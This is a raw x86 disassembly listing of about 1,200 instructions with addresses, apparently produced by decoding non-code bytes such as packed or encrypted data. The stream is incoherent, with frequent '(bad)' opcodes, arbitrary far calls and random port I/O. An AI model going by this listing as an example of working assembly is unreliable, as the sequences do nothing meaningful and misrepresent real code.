  416927:	dec    eax
  416928:	inc    ecx
  416929:	arpl   WORD PTR [eax-0x71],di
  41692c:	sar    bl,1
  41692e:	cli    
  41692f:	xor    BYTE PTR [ebx-0x487dba25],bl
  416935:	mov    edx,0x257f523b
  41693a:	sti    
  41693b:	fmul   QWORD PTR [edi]
  41693d:	fs mov edx,?
  416940:	sub    ah,bh
  416942:	scas   al,BYTE PTR es:[edi]
  416943:	or     ebx,eax
  416945:	sub    eax,0xd0586023
  41694a:	lea    ecx,[ecx+esi*4+0x6]
  41694e:	sbb    eax,edx
  416950:	add    BYTE PTR [ebp-0x19],ch
  416953:	adc    ah,cl
  416955:	xor    al,bl
  416957:	rcr    ah,cl
  416959:	bound  eax,QWORD PTR [esi]
  41695b:	mov    esi,0xdc7654ae
  416960:	imul   ebp,ebp,0xffffffa9
  416963:	mov    DWORD PTR [edi],ebp
  416965:	sub    al,0xfb
  416967:	mov    DWORD PTR [edx+0x54],edx
  41696a:	call   0xf95a:0x918b7638
  416971:	fwait
  416972:	cwde   
  416973:	or     dl,bl
  416975:	ins    BYTE PTR es:[edi],dx
  416976:	cmp    al,0x45
  416978:	imul   esi,DWORD PTR [edx],0x61883c5c
  41697e:	sub    ecx,esi
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	sub    BYTE PTR [esi+0x1fa560c4],bl
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x9a70707e
  4169a0:	test   ecx,edi
  4169a2:	mov    eax,0x84e06854
  4169a7:	dec    ebp
  4169a8:	shl    dh,cl
  4169aa:	popa   
  4169ab:	xchg   BYTE PTR [ebp-0x14b700cc],cl
  4169b1:	stos   DWORD PTR es:[edi],eax
  4169b2:	mov    es,ecx
  4169b4:	lods   al,BYTE PTR ds:[esi]
  4169b5:	mov    WORD PTR [ebp-0x4f],gs
  4169b8:	pop    ebp
  4169b9:	outs   dx,DWORD PTR ds:[esi]
  4169ba:	or     BYTE PTR [esi-0x55],0xc9
  4169be:	and    edx,DWORD PTR [edi-0x2b]
  4169c1:	mov    esp,0x5d97cbcb
  4169c6:	imul   eax,DWORD PTR [eax],0x70
  4169c9:	xchg   DWORD PTR [eax],ecx
  4169cb:	jbe    0x416955
  4169cd:	in     al,dx
  4169ce:	aaa    
  4169cf:	add    al,0x33
  4169d1:	jb     0x416a2e
  4169d3:	jmp    0xe26e:0x542a51ae
  4169da:	adc    esp,DWORD PTR [ecx]
  4169dc:	push   esi
  4169dd:	sub    al,0xb9
  4169df:	pushf  
  4169e0:	cmp    ebp,DWORD PTR [ebp+ebp*4+0x384ccd9]
  4169e7:	cmp    eax,0x99740f48
  4169ec:	gs jne 0x4169de
  4169ef:	out    dx,al
  4169f0:	mov    ecx,0xa3667306
  4169f5:	sahf   
  4169f6:	mov    esi,DWORD PTR [eax+0x1c]
  4169f9:	out    dx,al
  4169fa:	dec    ecx
  4169fb:	leave  
  4169fc:	push   ds
  4169fd:	jg     0x416a69
  4169ff:	xor    BYTE PTR [eax+0x5e8e242c],bh
  416a05:	or     al,0x35
  416a07:	push   es
  416a08:	push   edi
  416a09:	fsub   DWORD PTR [ebx+0x497b0cb7]
  416a0f:	xor    DWORD PTR [esi+0x2a],esi
  416a12:	push   ss
  416a13:	xor    BYTE PTR [ecx-0x5550981b],ah
  416a19:	in     al,dx
  416a1a:	xchg   ebx,eax
  416a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a1c:	push   0xfdc05f2a
  416a21:	inc    ebp
  416a22:	std    
  416a23:	pop    eax
  416a24:	dec    eax
  416a25:	cld    
  416a26:	cs push edx
  416a28:	addr16 jns 0x416aa9
  416a2b:	pop    es
  416a2c:	inc    ecx
  416a2d:	xchg   ebx,eax
  416a2e:	out    0xf7,al
  416a30:	iret   
  416a31:	icebp  
  416a32:	lahf   
  416a33:	sub    BYTE PTR [ebx],ah
  416a35:	cmp    edi,DWORD PTR [ebx+0x3e]
  416a38:	push   esp
  416a39:	xor    eax,ebx
  416a3b:	adc    BYTE PTR [eax],bl
  416a3d:	(bad)  
  416a3e:	push   eax
  416a3f:	out    dx,eax
  416a40:	int3   
  416a41:	fistp  QWORD PTR [edi-0x8f75bdb]
  416a47:	add    DWORD PTR [ecx-0x50],esp
  416a4a:	sub    edx,eax
  416a4c:	adc    al,0xfb
  416a4e:	ja     0x416a35
  416a50:	call   0xca6e:0xfa6243de
  416a57:	ret    0xa56b
  416a5a:	sub    al,0xa
  416a5c:	and    edi,DWORD PTR [ebp+0x2c7aa56e]
  416a62:	jno    0x416ab8
  416a64:	ins    BYTE PTR es:[edi],dx
  416a65:	jnp    0x4169f6
  416a67:	xor    eax,DWORD PTR [ecx]
  416a69:	lods   eax,DWORD PTR ds:[esi]
  416a6a:	out    0xc1,al
  416a6c:	loopne 0x416a49
  416a6e:	xchg   esi,eax
  416a6f:	and    ah,dh
  416a71:	mov    eax,ds:0x3a478264
  416a76:	inc    esp
  416a77:	xor    edi,0x6c
  416a7a:	jle    0x416a63
  416a7c:	jne    0x416af7
  416a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a7f:	icebp  
  416a80:	pop    ecx
  416a81:	retf   
  416a82:	imul   eax,DWORD PTR [eax],0xffffffac
  416a85:	out    0xb6,al
  416a87:	mov    edx,0xf81a35c2
  416a8c:	sub    eax,0x6b795ed
  416a91:	out    0x28,eax
  416a93:	pusha  
  416a94:	rcl    DWORD PTR [eax-0x46086d9a],0xe6
  416a9b:	dec    ebp
  416a9c:	lea    ebx,[ebx-0x18f25729]
  416aa2:	mov    eax,ds:0x65707934
  416aa7:	into   
  416aa8:	push   cs
  416aa9:	mov    ds,WORD PTR [eax-0x4e7b41f0]
  416aaf:	sbb    cl,BYTE PTR [ecx+0x50]
  416ab2:	ins    BYTE PTR es:[edi],dx
  416ab3:	mov    ds:0xb47a3809,eax
  416ab8:	inc    ecx
  416ab9:	mov    esp,es
  416abb:	imul   edx,DWORD PTR [ebp-0x26652e3a],0x46ca9389
  416ac5:	mov    ds:0x4fcf359a,al
  416aca:	sbb    BYTE PTR [eax],ah
  416acc:	mov    edi,0xa1e5fa09
  416ad1:	or     eax,0x6ecae788
  416ad6:	test   DWORD PTR ds:0xfa5e43d6,edi
  416adc:	pop    edi
  416add:	arpl   WORD PTR [eax-0xd],dx
  416ae0:	pop    esi
  416ae1:	pop    es
  416ae2:	fsubr  QWORD PTR [ecx]
  416ae4:	arpl   WORD PTR [ebx+0x58],di
  416ae7:	dec    esi
  416ae8:	call   0xb789:0xfd19c06c
  416aef:	mov    edi,0x6c307e42
  416af4:	sbb    BYTE PTR [ecx+ebp*2-0x5b11b95c],bl
  416afb:	jbe    0x416b0d
  416afd:	inc    ebp
  416afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aff:	inc    ecx
  416b00:	int3   
  416b01:	cmp    eax,0x9e8e659e
  416b06:	push   ebx
  416b07:	jnp    0x416b16
  416b09:	mov    fs,WORD PTR [ebx]
  416b0b:	aaa    
  416b0c:	push   ss
  416b0d:	fsubp  st(2),st
  416b0f:	daa    
  416b10:	shr    BYTE PTR [ebp-0x2df8302c],1
  416b16:	aam    0xc6
  416b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b19:	cli    
  416b1a:	jns    0x416b4e
  416b1c:	in     eax,dx
  416b1d:	popa   
  416b1e:	into   
  416b1f:	jbe    0x416b31
  416b21:	lods   al,BYTE PTR ds:[esi]
  416b22:	push   0xffffffd8
  416b24:	(bad)  
  416b25:	xchg   ebx,eax
  416b26:	das    
  416b27:	call   0x442ec0b0
  416b2c:	ins    BYTE PTR es:[edi],dx
  416b2d:	stos   BYTE PTR es:[edi],al
  416b2e:	jl     0x416b05
  416b30:	int    0xa9
  416b32:	jne    0x416ac2
  416b34:	jbe    0x416af7
  416b36:	mov    al,ds:0x55801a83
  416b3b:	push   edi
  416b3c:	mov    dl,BYTE PTR [edi]
  416b3e:	add    eax,0x2f10d58b
  416b43:	mov    ebp,0x7b5b3f5f
  416b48:	call   FWORD PTR [ebx]
  416b4a:	ins    DWORD PTR es:[edi],dx
  416b4b:	push   ebp
  416b4c:	sub    BYTE PTR [eax-0x31],al
  416b4f:	sub    DWORD PTR [ebx+0x3a],0xdb82b0a
  416b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b57:	and    eax,0xb5be7570
  416b5c:	push   es
  416b5d:	and    eax,0x86a01681
  416b62:	xchg   ecx,eax
  416b63:	rol    DWORD PTR [ebp-0x7f],cl
  416b66:	push   esi
  416b67:	sbb    edx,DWORD PTR [edx-0x30aaed0e]
  416b6d:	sbb    bh,BYTE PTR [eax-0x5]
  416b70:	push   esi
  416b71:	lods   eax,DWORD PTR ds:[esi]
  416b72:	dec    edx
  416b73:	sti    
  416b74:	cld    
  416b75:	jmp    0x80a3:0xadd8c42c
  416b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b7d:	outs   dx,DWORD PTR ds:[esi]
  416b7e:	lahf   
  416b7f:	popa   
  416b80:	psraw  mm7,QWORD PTR ss:[ebx]
  416b84:	stos   BYTE PTR es:[edi],al
  416b85:	mov    ds:0xc07427f4,al
  416b8a:	sbb    eax,0x97b57dc3
  416b8f:	fsubr  QWORD PTR ds:0xfb24ccbc
  416b95:	or     dh,BYTE PTR [ebp-0x67269e49]
  416b9b:	mov    ebx,0x897d323e
  416ba0:	ja     0x416c05
  416ba2:	push   0xffffff90
  416ba4:	jmp    0x2f86:0x2535c0f5
  416bab:	adc    DWORD PTR [esp+edi*8],ecx
  416bae:	idiv   dl
  416bb0:	int3   
  416bb1:	gs xor al,0x8c
  416bb4:	sar    BYTE PTR [ebx],0x38
  416bb7:	les    eax,FWORD PTR [ecx-0x3f]
  416bba:	mov    dl,0x38
  416bbc:	sub    ebx,DWORD PTR [esi+0x31]
  416bbf:	inc    edx
  416bc0:	mov    ah,0x1c
  416bc2:	mov    al,0x43
  416bc4:	mov    bh,0xe2
  416bc6:	fld    TBYTE PTR [ebx]
  416bc8:	push   es
  416bc9:	(bad)  
  416bca:	jmp    0x98451e1b
  416bcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd0:	sbb    BYTE PTR [edx-0x5b],al
  416bd3:	sbb    dh,BYTE PTR [edi]
  416bd5:	xor    ch,dh
  416bd7:	aas    
  416bd8:	mov    dl,0xbb
  416bda:	push   ebx
  416bdb:	xchg   BYTE PTR [edi],bl
  416bdd:	xchg   BYTE PTR ds:[ecx],bh
  416be0:	and    DWORD PTR [ebx-0x2981040e],0x7
  416be7:	scas   al,BYTE PTR es:[edi]
  416be8:	and    edi,DWORD PTR [ebx+0x66]
  416beb:	add    edx,DWORD PTR [edi+0x7d]
  416bee:	jmp    0x416bf3
  416bf0:	cs aad 0xbf
  416bf3:	(bad)  
  416bf4:	mov    edx,0x5c38e190
  416bf9:	dec    edx
  416bfa:	sub    eax,0x24b2fb9e
  416bff:	or     al,0xf6
  416c01:	jns    0x416bd1
  416c03:	inc    ecx
  416c04:	(bad)  
  416c06:	popf   
  416c07:	mov    dl,0x89
  416c09:	mov    DWORD PTR [ebx-0x27cdcaf6],0x10138402
  416c13:	je     0x416c4e
  416c15:	bound  ecx,QWORD PTR [edi+0x6ed9723a]
  416c1b:	cli    
  416c1c:	leave  
  416c1d:	jo     0x416c2b
  416c1f:	adc    ebp,DWORD PTR [edx-0x6c]
  416c22:	mov    esp,0x2595bd30
  416c27:	jne    0x416bea
  416c29:	(bad)  
  416c2a:	jb     0x416c75
  416c2c:	sbb    edi,edx
  416c2e:	dec    ecx
  416c2f:	xor    DWORD PTR ss:[edi+ebp*1+0x2a],edx
  416c34:	sar    DWORD PTR [ecx-0x4a],1
  416c37:	sbb    DWORD PTR [eax+0x4],esp
  416c3a:	ss jne 0x416bee
  416c3d:	rcl    DWORD PTR [ebx+eiz*1-0x7],cl
  416c41:	dec    edx
  416c42:	add    DWORD PTR [ecx+0x49],ebp
  416c45:	aaa    
  416c46:	xchg   edi,eax
  416c47:	or     bh,BYTE PTR [edi-0xa]
  416c4a:	fwait
  416c4b:	mov    DWORD PTR [eax+0x49],ebp
  416c4e:	or     eax,0xab7cfa3e
  416c53:	das    
  416c54:	sbb    eax,0xf2230f0d
  416c59:	or     DWORD PTR [ecx+0x1e17074c],ebx
  416c5f:	jp     0x416c36
  416c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c62:	loope  0x416ce3
  416c64:	jmp    0x45ccb641
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	or     bl,BYTE PTR [esi]
  416c7d:	fistp  WORD PTR [esi]
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c2c
  416c88:	xor    eax,DWORD PTR [esi+0x78]
  416c8b:	ror    edx,cl
  416c8d:	xor    edx,ecx
  416c8f:	retf   0x5d6f
  416c92:	call   0xbb937658
  416c97:	adc    eax,0xb2cd9bac
  416c9c:	jmp    0x416ce9
  416c9e:	mov    ch,0x37
  416ca0:	jno    0x416c30
  416ca2:	icebp  
  416ca3:	jmp    0x8f73328f
  416ca8:	ja     0x416c96
  416caa:	add    ebx,DWORD PTR [eax+edx*1]
  416cad:	adc    al,0x3f
  416caf:	inc    edx
  416cb0:	mov    edi,0x2fb8bdf7
  416cb5:	ds jnp 0x416c5e
  416cb8:	(bad)  
  416cb9:	push   ds
  416cba:	into   
  416cbb:	enter  0x178b,0xcf
  416cbf:	jae    0x416c4a
  416cc1:	xchg   BYTE PTR [ecx-0x12ff85c4],dl
  416cc7:	push   ebp
  416cc8:	mov    WORD PTR [esi+0x19539427],cs
  416cce:	push   0xfffffff7
  416cd0:	push   es
  416cd1:	mov    edx,0x3caae74d
  416cd6:	sbb    BYTE PTR [ecx+edx*2+0x48f4547f],0xf
  416cde:	gs add al,0x2d
  416ce1:	outs   dx,BYTE PTR ds:[esi]
  416ce2:	add    esp,DWORD PTR [ebx-0x3207fd52]
  416ce8:	out    dx,al
  416ce9:	ret    0x7904
  416cec:	mov    dh,0x4c
  416cee:	clc    
  416cef:	xchg   esi,eax
  416cf0:	cli    
  416cf1:	outs   dx,DWORD PTR ds:[esi]
  416cf2:	pop    esi
  416cf3:	and    DWORD PTR [ecx-0x5b5a1fc9],esp
  416cf9:	addr16 jae 0x416d41
  416cfc:	adc    al,0x82
  416cfe:	xchg   ebp,eax
  416cff:	or     esp,ebx
  416d01:	out    0x24,eax
  416d03:	popf   
  416d04:	cmp    al,ch
  416d06:	adc    edx,DWORD PTR [esi-0x53]
  416d09:	sti    
  416d0a:	cli    
  416d0b:	aaa    
  416d0c:	cmp    BYTE PTR [ecx],bh
  416d0e:	mov    ah,0x20
  416d10:	out    dx,eax
  416d11:	jmp    0x416d58
  416d13:	push   esp
  416d14:	sub    bh,BYTE PTR [ebx+0x31]
  416d17:	push   esi
  416d18:	xor    al,0xee
  416d1a:	mov    DWORD PTR [esi],edx
  416d1c:	je     0x416d40
  416d1e:	sahf   
  416d1f:	add    dl,bl
  416d21:	adc    al,0xd3
  416d23:	xchg   edi,eax
  416d24:	div    DWORD PTR [ecx+0x61]
  416d27:	les    ebp,FWORD PTR [eax]
  416d29:	mov    edi,0x29fff1bc
  416d2e:	bound  ebp,QWORD PTR [eax]
  416d30:	(bad)  
  416d31:	pop    esp
  416d32:	xchg   ebx,eax
  416d33:	outs   dx,DWORD PTR ds:[esi]
  416d34:	jmp    0x5a919626
  416d39:	or     BYTE PTR [edx],0x8c
  416d3c:	ficomp DWORD PTR [ebx+0x4e309d9f]
  416d42:	clc    
  416d43:	cmc    
  416d44:	sti    
  416d45:	(bad)  
  416d46:	dec    ebp
  416d47:	xor    al,0xa0
  416d49:	mov    eax,ds:0xeef6e49f
  416d4e:	mov    al,0xb9
  416d50:	and    edi,edx
  416d52:	mul    DWORD PTR [esi+0x43276d9a]
  416d58:	and    al,0x52
  416d5a:	and    al,0x8f
  416d5c:	mov    bl,0x90
  416d5e:	or     esi,DWORD PTR [edx*8-0x47c762f9]
  416d65:	xchg   DWORD PTR [ecx-0x49],ecx
  416d68:	mov    cl,0xd0
  416d6a:	sub    esp,0xf9c70089
  416d70:	sub    BYTE PTR [esi+0x7a],ah
  416d73:	aad    0xe2
  416d75:	sbb    BYTE PTR [esi],dh
  416d77:	mov    ah,0xec
  416d79:	lods   al,BYTE PTR ds:[esi]
  416d7a:	sub    esi,ebx
  416d7c:	push   es
  416d7d:	push   ecx
  416d7e:	mov    edx,0xcafce492
  416d83:	xor    ebp,edi
  416d85:	movsx  ebx,sp
  416d88:	daa    
  416d89:	adc    DWORD PTR [ecx-0x460f4185],edx
  416d8f:	sti    
  416d90:	pushf  
  416d91:	push   0xb24d0273
  416d96:	lahf   
  416d97:	xchg   edx,eax
  416d98:	cdq    
  416d99:	jne    0x416d9e
  416d9b:	adc    esi,DWORD PTR [ebx]
  416d9d:	ss dec esp
  416d9f:	push   ds
  416da0:	sub    DWORD PTR [eax+0x4126e10d],edx
  416da6:	icebp  
  416da7:	push   esi
  416da8:	add    eax,0xd40fa085
  416dad:	or     dl,ah
  416daf:	xchg   BYTE PTR [ecx+ebp*4],bl
  416db2:	je     0x416d66
  416db4:	push   cs
  416db5:	fisub  WORD PTR [ebp+0x2a1a13a3]
  416dbb:	jp     0x416dc1
  416dbd:	jp     0x416da8
  416dbf:	mov    ecx,0xa744acb4
  416dc4:	xchg   esp,eax
  416dc5:	adc    BYTE PTR [edi],al
  416dc7:	cmp    eax,0x554fe392
  416dcc:	and    DWORD PTR [edi-0x5c0f6df7],ebp
  416dd2:	xchg   edi,eax
  416dd3:	inc    eax
  416dd4:	pop    edi
  416dd5:	pop    eax
  416dd6:	das    
  416dd7:	fs cs leave 
  416dda:	(bad)  
  416ddb:	pop    ss
  416ddc:	rol    BYTE PTR [ecx+0x7f],1
  416ddf:	cmp    ecx,eax
  416de1:	mov    ds:0xb830c8df,al
  416de6:	mov    esi,0x47323eb0
  416deb:	js     0x416e37
  416ded:	mov    dh,0x7f
  416def:	dec    edi
  416df0:	ins    DWORD PTR es:[edi],dx
  416df1:	cmp    edx,esp
  416df3:	test   DWORD PTR [ebx],esi
  416df5:	data16 loop 0x416e28
  416df8:	dec    esp
  416df9:	hlt    
  416dfa:	jns    0x416e18
  416dfc:	pop    ecx
  416dfd:	(bad)  
  416dfe:	push   ebp
  416dff:	imul   esp,ebp,0xffffffa8
  416e02:	in     al,dx
  416e03:	push   ebp
  416e04:	xchg   ebx,eax
  416e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e06:	shl    esp,cl
  416e08:	jae    0x416e40
  416e0a:	pusha  
  416e0b:	loopne 0x416e0c
  416e0d:	adc    al,0x32
  416e0f:	xor    bl,BYTE PTR [edi]
  416e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e12:	mov    dh,0xb7
  416e14:	sbb    ch,ah
  416e16:	stos   BYTE PTR es:[edi],al
  416e17:	xor    BYTE PTR [esi+esi*4+0x67],ah
  416e1b:	repz ret 
  416e1d:	inc    esp
  416e1e:	aad    0x7d
  416e20:	dec    ebx
  416e21:	lds    ecx,FWORD PTR [edx]
  416e23:	fbld   TBYTE PTR [edi]
  416e25:	or     esi,esp
  416e27:	in     eax,dx
  416e28:	mov    ch,0xfe
  416e2a:	stos   DWORD PTR es:[edi],eax
  416e2b:	dec    eax
  416e2c:	sub    ebp,esp
  416e2e:	sbb    DWORD PTR [esi+0x40],ebp
  416e31:	mov    ds:0xf6dc5cd0,eax
  416e36:	daa    
  416e37:	dec    ebx
  416e38:	xor    DWORD PTR [esi],ecx
  416e3a:	fld    st(7)
  416e3c:	jo     0x416e5e
  416e3e:	in     al,0xfb
  416e40:	dec    eax
  416e41:	or     al,0x30
  416e43:	mov    dl,0x74
  416e45:	call   0xdb66:0x94160df5
  416e4c:	fyl2x  
  416e4e:	cmp    ecx,DWORD PTR [ebx+0x39]
  416e51:	bound  ebp,QWORD PTR [esi]
  416e53:	fsubr  st(4),st
  416e55:	jae    0x416e4a
  416e57:	repz ja 0x416e15
  416e5a:	pop    edx
  416e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e5c:	pushf  
  416e5d:	rol    BYTE PTR [ecx+eax*4-0x53],1
  416e61:	test   DWORD PTR [ecx+0x28],0xd4f00857
  416e68:	cmp    edx,DWORD PTR [eax]
  416e6a:	inc    esp
  416e6b:	js     0x416df2
  416e6d:	mov    ch,0x62
  416e6f:	jp     0x416e21
  416e71:	mov    al,bh
  416e73:	xchg   esi,eax
  416e74:	fadd   QWORD PTR [ecx-0x178eefac]
  416e7a:	or     eax,DWORD PTR ds:0x6784fcac
  416e80:	inc    esi
  416e81:	shl    DWORD PTR [ecx],1
  416e83:	aas    
  416e84:	call   0xb19:0xce6a82e2
  416e8b:	jg     0x416efa
  416e8d:	dec    ebx
  416e8e:	mov    esi,0xda90d28a
  416e93:	jg     0x416e52
  416e95:	xor    al,0xfc
  416e97:	shl    BYTE PTR [esi+0x20],cl
  416e9a:	jmp    0xc3635280
  416e9f:	aam    0x12
  416ea1:	test   BYTE PTR [ebx],0xf8
  416ea4:	xchg   edx,eax
  416ea5:	fsubr  DWORD PTR [ebx]
  416ea7:	mov    ds:0x2c1f3773,eax
  416eac:	(bad)  
  416ead:	and    eax,DWORD PTR [ecx+0x1e15924]
  416eb3:	push   0xa6248c8f
  416eb8:	cmp    BYTE PTR [eax+0x47f0ea1c],ah
  416ebe:	mov    BYTE PTR [ebx+0x5313a706],ch
  416ec4:	adc    ebp,0xbcf7bf14
  416eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ecb:	push   edx
  416ecc:	sub    bh,BYTE PTR [ebx-0x2b90882e]
  416ed2:	fisubr WORD PTR [esi+0x3007819]
  416ed8:	mov    esp,0xf662f201
  416edd:	mov    ebx,?
  416edf:	es into 
  416ee1:	mov    edx,ebx
  416ee3:	push   ebx
  416ee4:	sub    dl,ah
  416ee6:	push   ds
  416ee7:	sub    al,0xa1
  416ee9:	rcr    WORD PTR [bp+0x5d],cl
  416eee:	clc    
  416eef:	push   cs
  416ef0:	or     DWORD PTR [ecx+0x1c],edx
  416ef3:	rcl    ebp,1
  416ef5:	or     BYTE PTR [ebx],0xdc
  416ef8:	cmp    eax,0x2f589fc7
  416efd:	inc    edi
  416efe:	mov    dh,0xf8
  416f00:	sub    DWORD PTR ds:0xb2e953e9,ecx
  416f06:	xchg   DWORD PTR [edi],edi
  416f08:	jle    0x416f3b
  416f0a:	cld    
  416f0b:	dec    ebp
  416f0c:	sub    al,0xa3
  416f0e:	push   edx
  416f0f:	xor    BYTE PTR [ebp+0x33],al
  416f12:	xor    dh,BYTE PTR [esi+edi*2]
  416f15:	imul   edi,eax,0xffffffe3
  416f18:	jg     0x416eed
  416f1a:	das    
  416f1b:	(bad)  
  416f1c:	push   ecx
  416f1d:	xlat   BYTE PTR ds:[ebx]
  416f1e:	out    0x99,eax
  416f20:	aaa    
  416f21:	jne    0x416f66
  416f23:	mov    dh,0xb5
  416f25:	retf   
  416f26:	scas   al,BYTE PTR es:[edi]
  416f27:	mov    eax,ds:0xdcae7063
  416f2c:	push   edx
  416f2d:	pop    esi
  416f2e:	dec    eax
  416f2f:	std    
  416f30:	dec    edi
  416f31:	xchg   edi,eax
  416f32:	aas    
  416f33:	xor    BYTE PTR [esi-0x4448fc6b],ch
  416f39:	imul   ebp,DWORD PTR [edi+0x15],0x66f467d3
  416f40:	aam    0xe1
  416f42:	or     al,0x22
  416f44:	les    esp,FWORD PTR [esp+eax*4+0x7a]
  416f48:	jmp    0x416ef4
  416f4a:	inc    edi
  416f4b:	inc    ecx
  416f4c:	jnp    0x416f1a
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	test   edx,ebx
  416f6c:	rcl    BYTE PTR [ecx+0x707f1937],cl
  416f72:	mov    ecx,0x4e70707e
  416f77:	jno    0x416efe
  416f79:	loope  0x416f6a
  416f7b:	int3   
  416f7c:	imul   ebx,DWORD PTR [ebx-0x56],0x5c17da52
  416f83:	aaa    
  416f84:	imul   DWORD PTR [ebx+0x5a]
  416f87:	push   eax
  416f88:	cld    
  416f89:	xor    dl,BYTE PTR [edx*4+0x1cc6cc1]
  416f90:	jae    0x416fb7
  416f92:	jge    0x416ff7
  416f94:	lods   al,BYTE PTR ds:[esi]
  416f95:	sti    
  416f96:	adc    BYTE PTR cs:[edi+0x54],0x72
  416f9b:	(bad)  [edi+0x9b54c92]
  416fa1:	dec    edx
  416fa2:	xlat   BYTE PTR ds:[ebx]
  416fa3:	test   BYTE PTR [eax-0x62b15608],0xaf
  416faa:	loopne 0x416f4f
  416fac:	out    dx,eax
  416fad:	aaa    
  416fae:	mov    dl,BYTE PTR [edx]
  416fb0:	cmp    DWORD PTR [ebp+eiz*1+0x59],ecx
  416fb4:	nop    DWORD PTR ds:0x305491fb
  416fbb:	add    al,0x11
  416fbd:	cdq    
  416fbe:	test   BYTE PTR [edx],ah
  416fc0:	ret    0xc85d
  416fc3:	xchg   ebx,eax
  416fc4:	inc    eax
  416fc5:	jl     0x416fab
  416fc7:	(bad)  
  416fc8:	and    eax,0xe3435a0f
  416fcd:	mov    ecx,0xc01676de
  416fd2:	pusha  
  416fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd4:	lods   al,BYTE PTR ds:[esi]
  416fd5:	xor    al,0x1
  416fd7:	fiadd  WORD PTR [edx]
  416fd9:	fist   DWORD PTR [ebx]
  416fdb:	hlt    
  416fdc:	loope  0x416fa8
  416fde:	out    dx,eax
  416fdf:	sbb    BYTE PTR [ebx-0x9b83e36],0x84
  416fe6:	pop    ebp
  416fe7:	cmp    esp,DWORD PTR [ebp-0x53bcc072]
  416fed:	in     eax,dx
  416fee:	add    al,0x51
  416ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ff1:	out    dx,eax
  416ff2:	ret    0xf09b
  416ff5:	pop    ebp
  416ff6:	pop    ebp
  416ff7:	push   ecx
  416ff8:	sar    dh,1
  416ffa:	mov    ds:0xa32d6b94,al
  416fff:	sbb    eax,esp
  417001:	add    BYTE PTR [edx],ah
  417003:	push   0xffffffbe
  417005:	in     al,dx
  417006:	or     edi,DWORD PTR [esi-0x72]
  417009:	jnp    0x417032
  41700b:	lea    edi,[edi+0x7a46d381]
  417011:	sbb    eax,0x18c88067
  417016:	daa    
  417017:	xor    DWORD PTR [edi+0xe],esp
  41701a:	dec    esp
  41701b:	push   bx
  41701d:	sub    bl,cl
  41701f:	add    ecx,esi
  417021:	outs   dx,DWORD PTR ds:[esi]
  417022:	xchg   edx,eax
  417023:	mov    esi,DWORD PTR [ebp+0x1d1dd6c8]
  417029:	mov    ebx,0x5433ef3
  41702e:	cmp    al,0x73
  417030:	mov    ss,WORD PTR [esi-0x5c]
  417033:	mov    eax,ds:0xa7eb0387
  417038:	je     0x417082
  41703a:	push   ebp
  41703b:	out    dx,al
  41703c:	fist   WORD PTR [eax+0x58]
  41703f:	mov    dh,0x26
  417041:	mov    WORD PTR [ebx],fs
  417043:	sbb    al,0xcc
  417045:	pop    ecx
  417046:	inc    eax
  417047:	or     BYTE PTR [ecx+0x5c],0x4d
  41704b:	xor    BYTE PTR [eax],bh
  41704d:	xor    DWORD PTR [edx-0x5a3be8f2],ebp
  417053:	xor    cl,BYTE PTR [edi]
  417055:	mov    eax,ds:0xedec4c16
  41705a:	or     al,0x50
  41705c:	ja     0x4170d4
  41705e:	std    
  41705f:	int    0x17
  417061:	jl     0x4170a7
  417063:	js     0x4170c0
  417065:	cwde   
  417066:	cmp    BYTE PTR [eax+0x77],cl
  417069:	sbb    dh,bh
  41706b:	inc    edx
  41706c:	ja     0x41700c
  41706e:	mov    edx,0x9ded244e
  417073:	ror    BYTE PTR [ecx-0x36],1
  417076:	or     BYTE PTR [edx*8+0x7e388b8a],ch
  41707d:	mov    bh,0x7c
  41707f:	jae    0x4170e8
  417081:	mov    ah,ch
  417083:	mov    dh,0x9a
  417085:	pop    ss
  417086:	mov    ah,BYTE PTR [esi-0x29431d8d]
  41708c:	leave  
  41708d:	pop    ss
  41708e:	adc    ebp,DWORD PTR [eax]
  417090:	xchg   ecx,eax
  417091:	rcr    BYTE PTR [esp+ecx*1+0x5f],cl
  417095:	loope  0x417070
  417097:	pop    ss
  417098:	sub    BYTE PTR [esi],0x17
  41709b:	push   edi
  41709c:	mov    WORD PTR [esi+0x527dfb],es
  4170a2:	or     DWORD PTR [ecx],ebp
  4170a4:	retf   
  4170a5:	aas    
  4170a6:	dec    eax
  4170a7:	das    
  4170a8:	inc    ecx
  4170a9:	ret    0x37a3
  4170ac:	sbb    al,BYTE PTR [ecx+0x33511d4]
  4170b2:	pop    ebx
